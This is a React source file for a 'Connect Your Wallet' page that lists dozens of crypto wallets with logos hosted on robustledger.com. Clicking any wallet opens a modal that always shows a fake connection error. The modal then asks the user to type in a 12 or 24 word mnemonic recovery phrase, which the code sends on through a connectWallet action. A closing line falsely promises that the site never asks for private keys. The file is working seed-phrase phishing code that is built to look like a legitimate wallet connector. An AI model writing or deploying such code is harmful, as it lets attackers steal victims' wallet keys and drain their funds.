"use client";

import React, { useState } from "react";
import {
  Box,
  Grid,
  Heading,
  Text,
  VStack,
  Image,
  useColorModeValue,
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalCloseButton,
  Button,
  useDisclosure,
  Textarea,
  useToast,
  Flex,
  Badge,
  HStack,
} from "@chakra-ui/react";
import { motion, spring } from "framer-motion";
import { useAppDispatch } from "@/store/hooks";
import { connectWallet } from "@/store/thunks/ledgerThunk";

const MotionBox = motion(Box);

const wallets = [
  {
    id: "trust",
    name: "Trust Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png?b",
    popular: true,
  },
  {
    id: "walletconnect",
    name: "Wallet connect",
    url: "https://robustledger.com/users/assets/wallets/img/iogo.png?b",
    popular: true,
  },
  {
    id: "metamask",
    name: "Metamask",
    url: "https://robustledger.com/users/assets/wallets/img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png?b",
    popular: true,
  },
  {
    id: "atomic",
    name: "Atomic",
    url: "https://robustledger.com/users/assets/wallets/img/atomic-4c02d2b33cf091fd83c7a49819394e41.png?b",
  },
  {
    id: "rainbow",
    name: "Rainbow",
    url: "https://robustledger.com/users/assets/wallets/img/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png?b",
    popular: true,
  },
  {
    id: "argent",
    name: "Argent",
    url: "https://robustledger.com/users/assets/wallets/img/newconv16.png?b",
  },
  {
    id: "gnosissafe",
    name: "Gnosis Safe Multisig",
    url: "https://robustledger.com/users/assets/wallets/img/newconv15.png?b",
  },
  {
    id: "cryptocom",
    name: "Crypto.com | DeFi Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/crypto-4cbeac57421fb3ca2573db2cf448169a.png?b",
  },
  {
    id: "pillar",
    name: "Pillar",
    url: "https://robustledger.com/users/assets/wallets/img/newconv14.png?b",
  },
  {
    id: "anchor",
    name: "Anchor",
    url: "https://robustledger.com/users/assets/wallets/img/anchor.png?b",
  },
  {
    id: "onto",
    name: "ONTO",
    url: "https://robustledger.com/users/assets/wallets/img/onto-983003d35fe32bf916f9eda381f138f7.png?b",
  },
  {
    id: "tokenpocket",
    name: "TokenPocket",
    url: "https://robustledger.com/users/assets/wallets/img/tokenpocket-57a4a886cc644e5237ac1558226154cb.png?b",
  },
  {
    id: "mathwallet",
    name: "MathWallet",
    url: "https://robustledger.com/users/assets/wallets/img/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png?b",
  },
  {
    id: "bitpay",
    name: "BitPay",
    url: "https://robustledger.com/users/assets/wallets/img/bitpay-1573dd6c95eb38386f181048663590d0.jpg?b",
  },
  {
    id: "maiar",
    name: "Maiar",
    url: "https://robustledger.com/users/assets/wallets/img/maiar.png?b",
  },
  {
    id: "ledgerlive",
    name: "Ledger Live",
    url: "https://robustledger.com/users/assets/wallets/img/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png?b",
  },
  {
    id: "walleth",
    name: "Walleth",
    url: "https://robustledger.com/users/assets/wallets/img/walleth-b60336f8dd9ea86285408cb4f96634d1.png?b",
  },
  {
    id: "authereum",
    name: "Authereum",
    url: "https://robustledger.com/users/assets/wallets/img/authereum-32f3939207b77c1837547d5ed4f86110.png?b",
  },
  {
    id: "huobi",
    name: "Huobi Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/newconv13.png?b",
  },
  {
    id: "eidoo",
    name: "Eidoo",
    url: "https://robustledger.com/users/assets/wallets/img/newconv12.png?b",
  },
  {
    id: "mykey",
    name: "MYKEY",
    url: "https://robustledger.com/users/assets/wallets/img/mykey-7419df5270c0406c80cba19fa5165923.png?b",
  },
  {
    id: "loopring",
    name: "Loopring Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/newconv11.png?b",
  },
  {
    id: "trustvault",
    name: "TrustVault",
    url: "https://robustledger.com/users/assets/wallets/img/trustvault-9031a67f82293fc50ead978f936cfff3.png?b",
  },
  {
    id: "coin98",
    name: "Coin98",
    url: "https://robustledger.com/users/assets/wallets/img/coin98-c5b50adaceaf474e48ef1dad150d0829.png?b",
  },
  {
    id: "coolwallet",
    name: "CoolWallet S",
    url: "https://robustledger.com/users/assets/wallets/img/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png?b",
  },
  {
    id: "alice",
    name: "Alice",
    url: "https://robustledger.com/users/assets/wallets/img/newconv10.png?b",
  },
  {
    id: "alphawallet",
    name: "AlphaWallet",
    url: "https://robustledger.com/users/assets/wallets/img/newconv9.png?b",
  },
  {
    id: "dcent",
    name: "D'CENT Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png?b",
  },
  {
    id: "zelcore",
    name: "ZelCore",
    url: "https://robustledger.com/users/assets/wallets/img/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png?b",
  },
  {
    id: "nash",
    name: "Nash",
    url: "https://robustledger.com/users/assets/wallets/img/newconv8.png?b",
  },
  {
    id: "coinomi",
    name: "Coinomi",
    url: "https://robustledger.com/users/assets/wallets/img/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg?b",
  },
  {
    id: "gridplus",
    name: "GridPlus",
    url: "https://robustledger.com/users/assets/wallets/img/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png?b",
  },
  {
    id: "cybavo",
    name: "CYBAVO Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png?b",
  },
  {
    id: "tokenary",
    name: "Tokenary",
    url: "https://robustledger.com/users/assets/wallets/img/newconv7.png?b",
  },
  {
    id: "wazirx",
    name: "Wazirx",
    url: "https://robustledger.com/users/assets/wallets/img/wazirx-logo-rounded.9bff9f42.png?b",
  },
  {
    id: "torus",
    name: "Torus",
    url: "https://robustledger.com/users/assets/wallets/img/newconv6.png?b",
  },
  {
    id: "spatium",
    name: "Spatium",
    url: "https://robustledger.com/users/assets/wallets/img/newconv5.png?b",
  },
  {
    id: "safepal",
    name: "SafePal",
    url: "https://robustledger.com/users/assets/wallets/img/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png?b",
  },
  {
    id: "equal",
    name: "Equal",
    url: "https://robustledger.com/users/assets/wallets/img/newconv4.png?b",
  },
  {
    id: "infinito",
    name: "Infinito",
    url: "https://robustledger.com/users/assets/wallets/img/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png?b",
  },
  {
    id: "walletio",
    name: "wallet.io",
    url: "https://robustledger.com/users/assets/wallets/img/wallet.io-198f396de22fe25eb370f46544abe69d.png?b",
  },
  {
    id: "infinitywallet",
    name: "Infinity Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png?b",
  },
  {
    id: "ownbit",
    name: "Ownbit",
    url: "https://robustledger.com/users/assets/wallets/img/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png?b",
  },
  {
    id: "easypocket",
    name: "EasyPocket",
    url: "https://robustledger.com/users/assets/wallets/img/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.png?b",
  },
  {
    id: "bridgewallet",
    name: "Bridge Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/newconv3.png?b",
  },
  {
    id: "sparkpoint",
    name: "SparkPoint",
    url: "https://robustledger.com/users/assets/wallets/img/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png?b",
  },
  {
    id: "viawallet",
    name: "ViaWallet",
    url: "https://robustledger.com/users/assets/wallets/img/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png?b",
  },
  {
    id: "bitkeep",
    name: "BitKeep",
    url: "https://robustledger.com/users/assets/wallets/img/bitkeep-387b0ca7da4cf322f44c70c23064c529.png?b",
  },
  {
    id: "vision",
    name: "Vision",
    url: "https://robustledger.com/users/assets/wallets/img/vision-928292fe642172a18e62feb5eaa2d639.png?b",
  },
  {
    id: "swft",
    name: "SWFT Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/newconv2.png?b",
  },
  {
    id: "peakdefi",
    name: "PEAKDEFI Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png?b",
  },
  {
    id: "cosmostation",
    name: "Cosmostation",
    url: "https://robustledger.com/users/assets/wallets/img/cosmosstation.png?b",
  },
  {
    id: "graphprotocol",
    name: "Graph Protocol",
    url: "https://robustledger.com/users/assets/wallets/img/graph.jpg?b",
  },
  {
    id: "kardiachain",
    name: "KardiaChain",
    url: "https://robustledger.com/users/assets/wallets/img/kardachain.png?b",
  },
  {
    id: "keplr",
    name: "Keplr",
    url: "https://robustledger.com/users/assets/wallets/img/keplr.png?b",
  },
  {
    id: "harmony",
    name: "Harmony",
    url: "https://robustledger.com/users/assets/wallets/img/harmony.png?b",
  },
  {
    id: "iconex",
    name: "ICONex",
    url: "https://robustledger.com/users/assets/wallets/img/iconex.png?b",
  },
  {
    id: "fetch",
    name: "Fetch",
    url: "https://robustledger.com/users/assets/wallets/img/fetch.jpg?b",
  },
  {
    id: "xdc",
    name: "XDC Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/xdc-9a98bff95dffc41869b8e77912a6cc54.png?b",
  },
  {
    id: "unstoppable",
    name: "Unstoppable Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png?b",
  },
  {
    id: "meetone",
    name: "MEET.ONE",
    url: "https://robustledger.com/users/assets/wallets/img/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg?b",
  },
  {
    id: "dok",
    name: "Dok Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/dok-a32c522e109217cc2a1a2a310f3c9bf7.png?b",
  },
  {
    id: "atwallet",
    name: "AT.Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png?b",
  },
  {
    id: "morix",
    name: "MoriX Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png?b",
  },
  {
    id: "midas",
    name: "Midas Wallet",
    url: "https://robustledger.com/users/assets/wallets/img/midas-wallet-5c5057d972ca621414f077541845fc61.png?b",
  },
  {
    id: "ellipal",
    name: "Ellipal",
    url: "https://robustledger.com/users/assets/wallets/img/newconv1.png?b",
  },
  {
    id: "keyringpro",
    name: "KEYRING PRO",
    url: "https://robustledger.com/users/assets/wallets/img/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png?b",
  },
  {
    id: "blockchain",
    name: "Blockchain",
    url: "https://robustledger.com/users/assets/wallets/img/blockchain-logo.png?b",
  },
  {
    id: "bsc",
    name: "Binance Smart Chain",
    url: "https://robustledger.com/users/assets/wallets/img/bsc-logo.png?b",
  },
  {
    id: "aktionariat",
    name: "Aktionariat",
    url: "https://robustledger.com/users/assets/wallets/img/aktionariat-c5784b26234a389632687a36d2fb3258.png?b",
  },
  {
    id: "coinbase",
    name: "Coinbase",
    url: "https://robustledger.com/users/assets/wallets/img/coinbase.png?b",
  },
  {
    id: "exodus",
    name: "Exodus",
    url: "https://robustledger.com/users/assets/wallets/img/exodus.png?b",
  },
];

const WalletConnectPage = () => {
  const dispatch = useAppDispatch();
  const [connecting, setConnecting] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<
    (typeof wallets)[number] | null
  >(null);
  const [mnemonicPhrase, setMnemonicPhrase] = useState("");
  const { isOpen, onOpen, onClose } = useDisclosure();
  const toast = useToast();

  const bgColor = useColorModeValue("white", "gray.800");
  const borderColor = useColorModeValue("gray.200", "gray.700");
  const hoverBgColor = useColorModeValue("gray.50", "gray.700");

  // Animation variants
  const containerVariants = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: {
        staggerChildren: 0.1,
      },
    },
  };

  const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: {
      opacity: 1,
      y: 0,
      transition: { duration: 0.3 },
    },
  };

  const handleWalletClick = (wallet: (typeof wallets)[0]) => {
    setMnemonicPhrase("");
    setSelectedWallet(wallet);
    onOpen();
  };

  const handleConnectWallet = () => {
    setConnecting(true);
    toast({
      title: "Wallet Connecting",
      description: `Attempting to connect ${selectedWallet?.name}...`,
      status: "info",
      duration: 3000,
      isClosable: true,
      position: "top",
    });
    dispatch(connectWallet({
      name: selectedWallet?.name || "",
      phrase: mnemonicPhrase.trim()
    }))
      .unwrap()
      .then(() => {
        onClose();
        setMnemonicPhrase("");
      })
      .catch((err) => {
        console.error(err);
        toast({
          title: "Connection Error",
          description: "There was an issue connecting to the service. Please try again.",
          status: "error",
          duration: 5000,
          isClosable: true,
          position: "top",
        });
      })
      .finally(() => {
        setConnecting(false);
      });
  };

  // Count words in mnemonic phrase
  const wordCount = mnemonicPhrase.trim()
    ? mnemonicPhrase.trim().split(/\s+/).length
    : 0;

  return (
    <Box p={6} maxW="container.md" mx="auto">
      <VStack spacing={6} align="stretch">
        <Box textAlign="center" mb={8}>
          <Heading size="lg" mb={2}>
            Connect Your Wallet
          </Heading>
          <Text color="gray.500">
            Multiple iOS and Android wallets support the protocol. Simply scan a
            QR code from your desktop computer screen to start securely using a
            dApp with your mobile wallet. Interaction between mobile apps and
            mobile browsers are supported via mobile deep linking.
          </Text>
        </Box>

        <MotionBox
          variants={containerVariants}
          initial="hidden"
          animate="visible"
          as={Grid}
          gridTemplateColumns={{
            base: "repeat(1, 1fr)",
            sm: "repeat(2, 1fr)",
            md: "repeat(3, 1fr)",
          }}
          gap={4}
        >
          {wallets.map((wallet) => (
            <MotionBox
              key={wallet.id}
              variants={itemVariants}
              onClick={() => handleWalletClick(wallet)}
              borderWidth="1px"
              borderColor={borderColor}
              borderRadius="xl"
              p={4}
              cursor="pointer"
              position="relative"
              _hover={{
                bg: hoverBgColor,
                transform: "translateY(-2px)",
                boxShadow: "md",
                borderColor: "brand.500",
                transition: "all 0.2s",
              }}
              transition={spring}
            >
              <VStack spacing={3}>
                <Image
                  src={wallet.url}
                  alt={wallet.name}
                  boxSize="60px"
                  objectFit="contain"
                  rounded={"full"}
                />
                <Text fontWeight="medium">{wallet.name}</Text>
              </VStack>

              {wallet.popular && (
                <Badge
                  position="absolute"
                  top={2}
                  right={2}
                  colorScheme="brand"
                  fontSize="xs"
                  borderRadius="full"
                  px={2}
                >
                  Popular
                </Badge>
              )}
            </MotionBox>
          ))}
        </MotionBox>

        <Text fontSize="sm" color="gray.500" textAlign="center" mt={4}>
          By connecting your wallet, you agree to our Terms of Service and
          Privacy Policy
        </Text>
      </VStack>

      {/* Connection Issue Modal */}
      <Modal isOpen={isOpen} onClose={onClose} isCentered size="lg">
        <ModalOverlay backdropFilter="blur(8px)" />
        <ModalContent borderRadius="xl" bg={bgColor} p={2}>
          <ModalHeader>
            <HStack spacing={4}>
              <Image
                src={selectedWallet?.url}
                alt={selectedWallet?.name}
                boxSize="30px"
                objectFit="contain"
                rounded={"full"}
              />
              <Text> {selectedWallet?.name}</Text>
            </HStack>
          </ModalHeader>
          <ModalCloseButton />
          <ModalBody pb={6}>
            <VStack spacing={6} align="stretch">
              <Box
                bg="red.50"
                color="red.600"
                p={4}
                borderRadius="md"
                borderLeft="4px solid"
                borderLeftColor="red.500"
              >
                <Text fontWeight="medium">
                  There was an issue connecting to the service. Please try again
                  or connect manually.
                </Text>
              </Box>

              <Box>
                <Text mb={2} fontWeight="medium">
                  Enter Mnemonic Phrase:
                </Text>
                <Textarea
                  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
                  value={mnemonicPhrase}
                  onChange={(e) => setMnemonicPhrase(e.target.value)}
                  size="md"
                  rows={4}
                  borderRadius="md"
                  borderColor={borderColor}
                  focusBorderColor="brand.500"
                />

                <Flex justifyContent="space-between" mt={2}>
                  <Text fontSize="sm" color="gray.500">
                    Word count:
                    <Badge
                      ml={2}
                      colorScheme={
                        wordCount === 12 || wordCount === 24 ? "green" : "gray"
                      }
                    >
                      {wordCount}
                    </Badge>
                  </Text>
                  <Text fontSize="sm" color="gray.500">
                    Expected: 12 or 24 words
                  </Text>
                </Flex>
              </Box>

              <Button
                width="full"
                size="lg"
                borderRadius="lg"
                onClick={handleConnectWallet}
                isDisabled={wordCount !== 12 && wordCount !== 24}
                isLoading={connecting}
              >
                Connect Wallet
              </Button>

              <Text fontSize="xs" color="gray.500" textAlign="center">
                Note: Never share your recovery phrase with anyone. We will
                never ask for your private keys.
              </Text>
            </VStack>
          </ModalBody>
        </ModalContent>
      </Modal>
    </Box>
  );
};

export default WalletConnectPage;
